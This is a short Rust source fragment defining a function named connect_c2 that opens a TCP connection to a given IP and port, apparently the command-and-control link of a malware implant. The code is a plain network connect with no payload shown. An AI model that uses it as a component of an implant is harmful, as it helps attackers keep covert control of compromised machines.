use std::{error::Error, net::TcpStream};

pub fn connect_c2(ip : &String,port: u32) -> Result<TcpStream, Box<dyn Error>> {

    let host = format!("{ip}:{port}");
    
    let connection = TcpStream::connect(host.as_str())?;

    Ok(connection)

}